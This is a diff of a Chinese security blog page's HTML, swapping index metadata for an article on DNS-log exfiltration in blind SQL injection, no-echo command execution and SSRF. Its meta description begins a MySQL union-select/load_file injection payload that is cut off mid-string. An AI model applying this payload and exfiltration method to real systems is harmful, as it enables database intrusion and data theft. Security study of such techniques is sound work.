@@ -5,18 +5,19 @@
   
 
   
-  <title>依璇Script</title>
+  <title>让盲注不再&#34;盲目 | 依璇Script</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="久别后的重逢最是甘美">
-<meta property="og:type" content="website">
-<meta property="og:title" content="依璇Script">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="一.原理：访问一个域名的时候DNS服务器会留下记录 其格式为： 域名 IP:Port ;   二.适用场景：SQL注入中的盲注  无回显的命令执行  无回显的SSRF 三.利用手法：将敏感信息作为子域名提交给DNS服务器 并提取DNS记录 1.Mysql盲注1http://127.0.0.1/mysql.php?id=1 union select 1,2,load_file(CONCAT(&amp;apo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="让盲注不再&quot;盲目">
+<meta property="og:url" content="http://yoursite.com/2018/08/23/Dnslog/index.html">
 <meta property="og:site_name" content="依璇Script">
-<meta property="og:description" content="久别后的重逢最是甘美">
+<meta property="og:description" content="一.原理：访问一个域名的时候DNS服务器会留下记录 其格式为： 域名 IP:Port ;   二.适用场景：SQL注入中的盲注  无回显的命令执行  无回显的SSRF 三.利用手法：将敏感信息作为子域名提交给DNS服务器 并提取DNS记录 1.Mysql盲注1http://127.0.0.1/mysql.php?id=1 union select 1,2,load_file(CONCAT(&amp;apo">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-24T14:02:01.752Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="依璇Script">
-<meta name="twitter:description" content="久别后的重逢最是甘美">
+<meta name="twitter:title" content="让盲注不再&quot;盲目">
+<meta name="twitter:description" content="一.原理：访问一个域名的时候DNS服务器会留下记录 其格式为： 域名 IP:Port ;   二.适用场景：SQL注入中的盲注  无回显的命令执行  无回显的SSRF 三.利用手法：将敏感信息作为子域名提交给DNS服务器 并提取DNS记录 1.Mysql盲注1http://127.0.0.1/mysql.php?id=1 union select 1,2,load_file(CONCAT(&amp;apo">
   
     <link rel="alternate" href="/atom.xml" title="依璇Script" type="application/atom+xml">
   
@@ -67,9 +68,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-Dnslog" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-Dnslog" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/08/23/Dnslog/" class="article-date">
   <time datetime="2018-08-23T15:03:54.560Z" itemprop="datePublished">2018-08-23</time>
@@ -82,8 +81,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/23/Dnslog/">让盲注不再&#34;盲目</a>
+    <h1 class="article-title" itemprop="name">
+      让盲注不再&#34;盲目
     </h1>
   
 
@@ -111,11 +110,9 @@
     </footer>
   </div>
   
-</article>
-
-
+    
   
-
+</article>
 
 </section>
         
